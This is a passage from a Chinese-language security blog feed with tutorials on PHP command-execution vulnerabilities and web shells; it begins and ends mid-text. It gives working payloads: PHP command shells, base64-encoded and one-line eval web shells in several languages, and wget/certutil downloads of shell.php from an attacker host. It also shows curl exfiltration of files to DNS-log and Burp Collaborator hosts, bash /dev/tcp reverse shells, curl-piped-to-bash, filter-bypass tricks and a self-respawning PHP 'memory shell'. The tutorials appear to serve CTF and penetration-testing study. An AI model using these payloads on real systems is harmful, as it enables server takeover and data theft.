class="string">&#x27;fgets&#x27;</span>) &amp;&amp; function_exists(<span class="string">&#x27;feof&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>(!feof(<span class="variable">$handle</span>))</span><br><span class="line">            &#123;       </span><br><span class="line">                <span class="keyword">echo</span> fgets(<span class="variable">$handle</span>,<span class="number">1024</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pclose(<span class="variable">$handle</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/RwdCAor5hOgBx2F.png" alt="image-20211212162807861"></p>
<h3 id="proc-open-函数"><a href="#proc-open-函数" class="headerlink" title="proc_open() 函数"></a>proc_open() 函数</h3><p><code>proc_open()</code>函数执行一个命令，并且打开用来输入/输出的文件指针。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">            );</span><br><span class="line">    <span class="variable">$handle</span> = proc_open(<span class="variable">$command</span> ,<span class="variable">$descriptorspec</span> , <span class="variable">$pipes</span>); <span class="comment">// This will return the output to an array &#x27;pipes&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(is_resource(<span class="variable">$handle</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(function_exists(<span class="string">&#x27;fread&#x27;</span>) &amp;&amp; function_exists(<span class="string">&#x27;feof&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>(!feof(<span class="variable">$pipes</span>[<span class="number">1</span>]))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> fread(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">1024</span>);        </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(function_exists(<span class="string">&#x27;fgets&#x27;</span>) &amp;&amp; function_exists(<span class="string">&#x27;feof&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>(!feof(<span class="variable">$pipes</span>[<span class="number">1</span>]))</span><br><span class="line">            &#123;       </span><br><span class="line">                <span class="keyword">echo</span> fgets(<span class="variable">$pipes</span>[<span class="number">1</span>],<span class="number">1024</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pclose(<span class="variable">$handle</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/R6TYp24x3l7qnPg.png" alt="image-20211212163546227"></p>
<h3 id="反引号"><a href="#反引号" class="headerlink" title="反引号``"></a>反引号``</h3><p>``（反引号）函数将反引号里的内容当作shell命令执行。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="keyword">echo</span> `<span class="variable">$command</span>`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/AkZ6aUT274Jzxc9.png" alt="image-20211212170518001"></p>
<h2 id="无回显命令执行利用"><a href="#无回显命令执行利用" class="headerlink" title="无回显命令执行利用"></a>无回显命令执行利用</h2><blockquote>
<p>有回显的情况下相对交少，一般在实战环境环境中，无回显的环境较多，证明漏洞存在就需要各种利用外通信技巧。</p>
</blockquote>
<h3 id="利用延时测试漏洞"><a href="#利用延时测试漏洞" class="headerlink" title="利用延时测试漏洞"></a>利用延时测试漏洞</h3><p>Linux：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">| ping -c 5 127.0.0.1</span><br><span class="line">或</span><br><span class="line">| sleep 5</span><br></pre></td></tr></table></figure>
<p>Windows：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">| <span class="built_in">ping</span> -n <span class="number">5</span> <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="改变文件类型"><a href="#改变文件类型" class="headerlink" title="改变文件类型"></a>改变文件类型</h3><h4 id="重定向输出"><a href="#重定向输出" class="headerlink" title="重定向输出"></a>重定向输出</h4><p>通过执行命令，直接将php文件写入到在浏览器可直接读取的文件类型中(如txt文件)，然后访问txt文件即可得到php文件内容。</p>
<p>Linux：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat flag.php &gt; flag.txt</span><br><span class="line">cat flag.php &gt;&gt; flag.txt</span><br></pre></td></tr></table></figure>
<p>Windows：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> flag.php &gt; flag.txt</span><br><span class="line"><span class="built_in">type</span> flag.php &gt;&gt; flag.txt</span><br></pre></td></tr></table></figure>
<h4 id="复制命令"><a href="#复制命令" class="headerlink" title="复制命令"></a>复制命令</h4><p>Linux：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp flag.php flag.txt</span><br></pre></td></tr></table></figure>
<p>Windows：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> flag.php flag.txt</span><br></pre></td></tr></table></figure>
<h4 id="移动或重命名命令"><a href="#移动或重命名命令" class="headerlink" title="移动或重命名命令"></a>移动或重命名命令</h4><p>Linux：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv flag.php flag.txt</span><br><span class="line">rename flag.php flag.txt</span><br></pre></td></tr></table></figure>
<p>Windows：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">move</span> flag.php flag.txt</span><br><span class="line"><span class="built_in">rename</span> flag.php flag.txt</span><br></pre></td></tr></table></figure>
<h4 id="压缩命令"><a href="#压缩命令" class="headerlink" title="压缩命令"></a>压缩命令</h4><p>Linux：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">tar cvf flag.tar flag.php</span><br><span class="line">tar zcvf flag.tar.gz flag.php</span><br><span class="line">zip flag.zip flag.php</span><br></pre></td></tr></table></figure>
<p>Windows：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 需要主机安装WinRAR，一般是默认安装了的</span><br><span class="line">&quot;C:\Program Files\WinRAR\WinRAR.exe&quot; a flag.zip flag.php</span><br></pre></td></tr></table></figure>
<h3 id="写入或下载WebShell"><a href="#写入或下载WebShell" class="headerlink" title="写入或下载WebShell"></a>写入或下载WebShell</h3><h4 id="本地写入WebShell"><a href="#本地写入WebShell" class="headerlink" title="本地写入WebShell"></a>本地写入WebShell</h4><p>如果存在漏洞的页面有 web 服务器，有权限写入，利用 shell 命令写入 webshell 后门到网站目录，访问即可获取 webshell。</p>
<p>Linux：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWydjbWQnXSk/Pg==&quot;</span>|base64 -d &gt; shell.php</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/12/7e94oFuxmEnX1hb.png" alt="image-20211212232738201"></p>
<p>Windows：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ^&lt;?php phpinfo();eval($_POST[&#x27;hack&#x27;]);?^&gt; &gt; shell.php</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/13/uPZqJIgi43RcxrD.png" alt="image-20211213111839568"></p>
<blockquote>
<p>注：在cmd命令行中，<code>^</code>符号表示转义字符，类似编程语言的<code>\</code>符号</p>
</blockquote>
<h4 id="外部下载WebShell"><a href="#外部下载WebShell" class="headerlink" title="外部下载WebShell"></a>外部下载WebShell</h4><p>需要目标主机可以连接外网与攻击机互通。</p>
<p>Linux：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://hackroom.com/shell.php -O /var/www/html/shell.php </span><br></pre></td></tr></table></figure>
<p>Windows：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://hackroom.com/shell.php</span><br></pre></td></tr></table></figure>
<h3 id="带外通信"><a href="#带外通信" class="headerlink" title="带外通信"></a>带外通信</h3><h4 id="DNSLog平台"><a href="#DNSLog平台" class="headerlink" title="DNSLog平台"></a>DNSLog平台</h4><p>dnslog 是一个显示解析记录的平台，在无回显的情况下，通过访问 dnslog，dnslog 会把你访问的子域名的头文件记录下来。</p>
<blockquote>
<p>需要注意以下几点：</p>
<ul>
<li>命令执行时要避免空格，空格会导致空格后面的命令执行不到</li>
<li>将读取的文件命令用反引号``包含起来</li>
<li>拼接的域名有长度限制</li>
<li>此类方法仅Linux有效</li>
</ul>
</blockquote>
<p><img src="https://s2.loli.net/2021/12/13/uFnXb1pZalLqBzf.png" alt="image-20211213115440677"></p>
<p><img src="https://s2.loli.net/2021/12/13/g3eRP8w7qb2WCrc.png" alt="image-20211213115554344"></p>
<p>这里使用的是知道创宇的ceye.io，和dnslog一样是具有显示解析记录的平台。</p>
<blockquote>
<p>注：如果命令执行的结果有带空格符，可以将结果进行base64编码输出后再解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl `cat&lt;flag.php|base64`.v4utm7.ceye.io</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="BurpSuite-Collaborator-Client"><a href="#BurpSuite-Collaborator-Client" class="headerlink" title="BurpSuite - Collaborator Client"></a>BurpSuite - Collaborator Client</h4><p>使用<code>curl -F</code>将flag文件上传到BurpSuite的<strong>Collaborator Client</strong>（Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看POST请求包以及打Cookies）</p>
<ol>
<li><p><strong>获取<code>Collaborator Client</code>分配给Burp的链接</strong></p>
<p>打开Burp主界面 -&gt; 菜单（Burp）-&gt; Collaboraor Client -&gt; 点击 Copy to Clipboard</p>
<p><img src="https://s2.loli.net/2021/12/13/zA3bWjKhF8yDQMm.png" alt="在这里插入图片描述"></p>
<p><img src="https://s2.loli.net/2021/12/13/guBO3TjlLxQa8CJ.png" alt="在这里插入图片描述"></p>
<p>Copy得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jyla6p5cfepdojez34stnodch3ntbi.burpcollaborator.net</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p><strong>拼接payload并在命令执行处提交</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=|curl -X POST -F xx=@flag.php http://jyla6p5cfepdojez34stnodch3ntbi.burpcollaborator.net</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><strong>查看Collaborator Client收到的数据</strong><br><img src="https://s2.loli.net/2021/12/13/HiJu65xDboyOdKa.png" alt="在这里插入图片描述"></li>
</ol>
<p>成功得到flag。</p>
<h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><p>首先需要在攻击者的服务器发起监听（使用nc或者msf）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8888</span><br></pre></td></tr></table></figure>
<p>受害者执行命令有如下两种方法：</p>
<ol>
<li><p>直接在受害者服务器执行反弹shell命令（也可以进行base64编码）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.123.43/8888 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p>在攻击者的文件中写入反弹shell命令，再通过受害者服务器执行curl后执行bash命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 攻击者服务器文件写入：</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.123.43/8888 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 受害者执行命令：</span></span><br><span class="line">curl 192.168.123.43/attack.txt|bash</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h2><p>开发人员在开发过程中，为了避免命令执行漏洞，可能会过滤一些命令或者比较常见的攻击payload。攻击者会通过多种方式绕过过滤规则。</p>
<blockquote>
<p>注：以下绕过仅针对Linux环境</p>
</blockquote>
<h3 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h3><h4 id="IFS-绕过"><a href="#IFS-绕过" class="headerlink" title="${IFS}绕过"></a>${IFS}绕过</h4><p><code>$IFS</code>是shell的特殊环境变量，是Linux下的内部区域分隔符。$IFS中存储的值可以使空格、制表符、换行符或者其他自定义符号。</p>
<ul>
<li>${PS2} 对应字符 ‘&gt;’</li>
<li>${PS4} 对应字符 ‘+’</li>
<li>${IFS} 对应 内部字段分隔符</li>
<li>${9} 对应 空字符串</li>
</ul>
<p><img src="https://s2.loli.net/2021/12/12/g9vzHCVcXFt2Ni5.png" alt="image-20211212190346405"></p>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="{}绕过"></a>{}绕过</h4><p><img src="https://s2.loli.net/2021/12/12/ZAn2C3qfBsExGPR.png" alt="image-20211212180009550"></p>
<h3 id="绕过关键词过滤"><a href="#绕过关键词过滤" class="headerlink" title="绕过关键词过滤"></a>绕过关键词过滤</h3><h4 id="变量拼接绕过"><a href="#变量拼接绕过" class="headerlink" title="变量拼接绕过"></a>变量拼接绕过</h4><p>Linux支持变量赋值，可以通过变量拼接来绕过过滤规则</p>
<p><img src="https://s2.loli.net/2021/12/12/aHv7UtCo3I5bGfD.png" alt="image-20211212190622406"></p>
<h4 id="空变量绕过"><a href="#空变量绕过" class="headerlink" title="空变量绕过"></a>空变量绕过</h4><p><img src="https://s2.loli.net/2021/12/12/NG6x24lndhAbaqw.png" alt="image-20211212191153096"></p>
<h4 id="系统变量绕过"><a href="#系统变量绕过" class="headerlink" title="系统变量绕过"></a>系统变量绕过</h4><p><code>$&#123;SHELLOPTS&#125;</code>是系统变量，可以利用系统变量的字符拼接绕过过滤</p>
<p><img src="https://s2.loli.net/2021/12/12/38TVh5vXWr7FM1I.png" alt="image-20211212191700794"></p>
<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="\ 绕过"></a>\ 绕过</h4><p><img src="https://s2.loli.net/2021/12/12/bGB4E78tLPwV5xO.png" alt="image-20211212191845931"></p>
<h4 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h4><p><img src="https://s2.loli.net/2021/12/12/VLqdSJZR7yPT415.png" alt="image-20211212194334300"></p>
<h4 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h4><p>Linux支持利用通配符进行字符匹配。通配符的作用是在模糊查询时表示文件名中某些不确定的字符</p>
<ul>
<li><p>*  代表『 0 个到无穷多个』任意字符</p>
</li>
<li><p>?  代表『一定有一个』任意字符</p>
<p>同样代表『一定有一个在括号内』的字符(非任意字符)。例如 [abcd] 代表『一定有一个字符， 可能是 a, b, c, d 这四个任何一个』</p>
</li>
<li><p>[ - ]  若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 [0-9] 代表 0 到 9 之间的所有数字，因为数字的语系编码是连续的！</p>
</li>
<li><p><sup><a href="#fn_ " id="reffn_ "> </a></sup>  若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 [^abc] 代表 一定有一个字符，只要是非 a, b, c 的其他字符就接受的意思</p>
</li>
</ul>
<p><img src="https://s2.loli.net/2021/12/12/bZXmNRC287tngqO.png" alt="image-20211212192502084"></p>
<h4 id="BASE64编码绕过"><a href="#BASE64编码绕过" class="headerlink" title="BASE64编码绕过"></a>BASE64编码绕过</h4><p>利用系统函数base64对命令进行Base64编码，以绕过过滤。例如，<code>ls -l</code>命令的Base编码为d2hvYW1p，在利用<code>base64 -d</code>对d2hvYW1p进行解码，这样就绕过了过滤，并且正常执行了命令</p>
<p><img src="https://s2.loli.net/2021/12/12/iNXnZF8bVdKfhSl.png" alt="image-20211212192924415"></p>
<h4 id="expr和awk绕过"><a href="#expr和awk绕过" class="headerlink" title="expr和awk绕过"></a>expr和awk绕过</h4><p>通过<code>expr</code>和<code>awk</code>命令从其他文件中获取字符并进行命令构造</p>
<p><img src="https://s2.loli.net/2021/12/12/VkE2FvMTQGAohLz.png" alt="image-20211212194011451"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>曹玉杰，王乐，李家辉，孔韬循 编著《Web代码安全漏洞深度剖析》</li>
<li><a href="https://www.cnblogs.com/xhds/p/12250975.html">[web安全原理]PHP命令执行漏洞基础 - 笑花大王 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://blog.csdn.net/figli/article/details/41007573">PHP proc_open详解_figli的专栏-CSDN博客_proc_open</a></li>
<li><a href="https://blog.csdn.net/qq_43625917/article/details/107873787">浅谈PHP无回显命令执行的利用<em>qwzf-CSDN博客</em>无回显命令执行</a></li>
<li><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107996904">RCE命令执行/代码执行_hxhxhxhxx的博客-CSDN博客_rce执行</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>代码执行与命令执行</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>WebShell基础详解</title>
    <url>/post/4612b439.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WebShell基础"><a href="#WebShell基础" class="headerlink" title="WebShell基础"></a>WebShell基础</h2><h3 id="什么是WebShell？"><a href="#什么是WebShell？" class="headerlink" title="什么是WebShell？"></a>什么是WebShell？</h3><p>顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p>
<p>Webshell就是以<code>asp</code>、<code>php</code>、<code>jsp</code>或者<code>cgi</code>等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p>
<p>利用Webshell可以在Web服务器上执行系统命令、窃取数据、植入病毒、勒索核心数据、SEO挂马等恶意操作，危害极大。</p>
<p><img src="https://s2.loli.net/2021/12/15/vuwHK5k1SUAfjon.png" alt></p>
<h3 id="WebShell的特点"><a href="#WebShell的特点" class="headerlink" title="WebShell的特点"></a>WebShell的特点</h3><p>黑客使用Webshell的第一步通常是将其上传到可以访问的服务器中，例如利用用户CMS系统的第三方插件中的漏洞上传一个简单的php Webshell。当然，Webshell类型和作用也不完全相同，一些简单的Webshell只起到连接外界的作用，允许黑客插入更加精准的恶意脚本，执行他们所需要的指令；另外一些则可能更加复杂，带有数据库或文件浏览器，让黑客能够从数千英里之外的地方查看入侵系统的代码和数据。无论何种设计，Webshell都极其危险，是网络罪犯和高级持续威胁(APTs)的常用工具。Webshell常见的攻击特点主要有以下几点：</p>
<h4 id="持久化远程访问"><a href="#持久化远程访问" class="headerlink" title="持久化远程访问"></a>持久化远程访问</h4><p>Webshell脚本通常会包含后门，黑客上传Webshell之后，就可以充分利用Webshell的后门实现远程访问并控制服务器，从而达到长期控制网站服务器的目的。此外，在上传完Webshell之后，黑客会选择自己修复漏洞，以确保没有其他人会利用该漏洞。通过这种方式，黑客就可以一种低调的姿态，避免与管理员进行任何交互，同时仍然获得相同的结果。</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>在服务器没有配置错误的情况下，Webshell将在web服务器的用户权限下运行，而用户权限是有限的。通过Webshell，黑客可以利用系统上的本地漏洞来实现权限提升，从而获得Root权限，这样黑客基本上可以在系统上做任何事情，包括安装软件、更改权限、添加和删除用户、窃取密码、阅读电子邮件等等。</p>
<h4 id="隐蔽性极强"><a href="#隐蔽性极强" class="headerlink" title="隐蔽性极强"></a>隐蔽性极强</h4><p>Webshell可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制的服务器或远程主机交互的数据都是通过80端口传递，因此不会被防火墙拦截，在没有记录流量的情况下，Webshell使用post包发送，也不会被记录在系统日志中，只会在Web日志中记录一些数据提交的记录。</p>
<h3 id="WebShell的分类"><a href="#WebShell的分类" class="headerlink" title="WebShell的分类"></a>WebShell的分类</h3><p>Webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，JSP脚本木马，也有基于.NET的脚本木马。根据时代和技术的变迁，也有用python和lua编写的脚本木马，常用有如下几种：</p>
<h4 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h4><ul>
<li>体积大，功能全</li>
<li>会调用系统关键函数</li>
<li>以代码加密进行隐藏</li>
</ul>
<h4 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h4><ul>
<li>体积小，功能少</li>
<li>一般只有一个上传功能，用于上传大马</li>
</ul>
<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><ul>
<li>代码短</li>
<li>使用场景大，可单独生成文件，可插入文件</li>
<li>安全性高，隐藏性强，可变形免杀</li>
<li>框架不变，数据执行，数据传递</li>
</ul>
<h4 id="打包马"><a href="#打包马" class="headerlink" title="打包马"></a>打包马</h4><ul>
<li>主要用于打包网站源码</li>
</ul>
<h4 id="拖库马"><a href="#拖库马" class="headerlink" title="拖库马"></a>拖库马</h4><ul>
<li>主要用于导出网站数据库</li>
</ul>
<h4 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h4><ul>
<li>无文件落地</li>
<li>极难检测和发现</li>
<li>难以清除</li>
</ul>
<blockquote>
<p>注：之后所讲的WebShell就是指<strong>一句话木马</strong></p>
</blockquote>
<h3 id="WebShell的原理"><a href="#WebShell的原理" class="headerlink" title="WebShell的原理"></a>WebShell的原理</h3><p>Webshell的恶意性表现在它的实现功能上，是一段带有恶意目的的正常脚本代码。</p>
<p>不同脚本类型的一句话木马：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%eval request(“cmd”)%&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“cmd”],”unsafe”);%&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[‘cmd’]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/15/mUX3L27Bv14Iuqg.png" alt="Untitled Diagram.drawio (4)"></p>
<blockquote>
<p>这里仅对PHP的一句话木马进行分析，核心步骤如下：</p>
</blockquote>
<p><img src="https://s2.loli.net/2021/12/15/nyQbSpGiZqcamRk.png" alt="image-20211215203228477"></p>
<h4 id="数据的传递"><a href="#数据的传递" class="headerlink" title="数据的传递"></a>数据的传递</h4><ul>
<li><code>$_GET</code>、<code>$_POST</code>、<code>$_COOKIES</code>、<code>$_REQUEST</code>、<code>$_FILE</code>、<code>$_SERVER</code></li>
<li>从远程远程URL中获取数据: <code>file_get_contents</code>、<code>curl</code>、<code>svn_checkout</code>…（将需要执行的指令数据放在远程URL中，通过<code>URL_INCLUDE</code>来读取）</li>
<li>从本地磁盘文件中获取数据: <code>file</code>、<code>file_get_contents</code>…（将需要执行的指令数据放在本地磁盘文件中，利用IO函数来读取）</li>
<li>从数据库中读取（将需要执行的指令放在数据库中，利用数据库函数来读取）</li>
<li>从图片头部中获取: <code>exif_read_data</code>…（将需要执行的指令数据放在图片头部中，利用图片操作函数来读取）</li>
</ul>
<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><p><strong>将用户传输的数据进行执行</strong></p>
<ul>
<li>代码执行函数：<code>eval</code>、<code>assert</code>、<code>system</code>…执行（这是最普通、标准的代码执行）</li>
<li>LFI：<code>include</code>、<code>require</code>…（利用浏览器的伪协议将文件包含转化为代码执行）</li>
<li>动态函数执行：（<code>$()</code>…PHP的动态函数特性）</li>
<li>Curly Syntax：（<code>$&#123;$&#123;…&#125;&#125;</code>…这种思路可以把变量赋值的漏洞转化为代码执行的机会）</li>
</ul>
<h3 id="内存马-1"><a href="#内存马-1" class="headerlink" title="内存马"></a>内存马</h3><blockquote>
<p>有关Java内存马以及JspWebShell的免杀我打算之后在Java代码审计中详细讲解，这里就全部以PHP的脚本木马为主。</p>
</blockquote>
<h4 id="何为内存马？"><a href="#何为内存马？" class="headerlink" title="何为内存马？"></a>何为内存马？</h4><p>内存马是无文件攻击的一种常用手段，随着攻防演练热度越来越高：攻防双方的博弈，流量分析、EDR等专业安全设备被蓝方广泛使用，传统的文件上传的webshll或以文件形式驻留的后门越来越容易被检测到，内存马使用越来越多。</p>
<p>Webshell内存马，是在内存中写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马，其瞄准了企业的对外窗口：网站、应用。但传统的Webshell都是基于文件类型的，黑客可以利用上传工具或网站漏洞植入木马，区别在于Webshell内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，给检测带来巨大难度。</p>
<h4 id="PHP内存马"><a href="#PHP内存马" class="headerlink" title="PHP内存马"></a>PHP内存马</h4><p>PHP内存马，也叫做PHP不死马、不死僵尸，在线下AWD中是常用手段之一。在蚁剑中也有专门的插件可以一键注入内存马。原理也很简单，相对于Java可以直接把整个shell写入内存，php内存马的实现则是将一个木马反复写入，达到无法删除的目的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ignore_user_abort(<span class="literal">true</span>); <span class="comment">//设置客户端断开连接时是否中断脚本的执行</span></span><br><span class="line">set_time_limit(<span class="number">0</span>); <span class="comment">//设置脚本最大执行时间linux下可能不大好用</span></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>); <span class="comment">//删除自身</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;shell.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);<span class="comment">//恶意代码</span></span><br><span class="line">usleep(<span class="number">5000</span>); <span class="comment">//延迟执行可有可无</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>本质上原理是不变大，执行死循环，然后删除自身。但实际上这样做还是会有文件落地，只是管理员删不掉、删不完罢了。我们也可以用利用fastcgi对php攻击执行命令，但这样是否算一个驻留wenshell还有待争议。</p>
<h2 id="WebShell管理工具"><a href="#WebShell管理工具" class="headerlink" title="WebShell管理工具"></a>WebShell管理工具</h2><h3 id="中国菜刀（Chopper）"><a href="#中国菜刀（Chopper）" class="headerlink" title="中国菜刀（Chopper）"></a>中国菜刀（Chopper）</h3><p>中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UNICODE方式编译，支持多国语言输入显示。</p>
<p><img src="https://s2.loli.net/2021/12/15/iQcrKs9lduBCkW6.png" alt="img"></p>
<h3 id="蚁剑（AntSword）"><a href="#蚁剑（AntSword）" class="headerlink" title="蚁剑（AntSword）"></a>蚁剑（AntSword）</h3><p>中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！使用编/解码器进行流量混淆可绕过WAF，并且有多款实用插件。</p>
<p><strong>项目地址：</strong></p>
<ul>
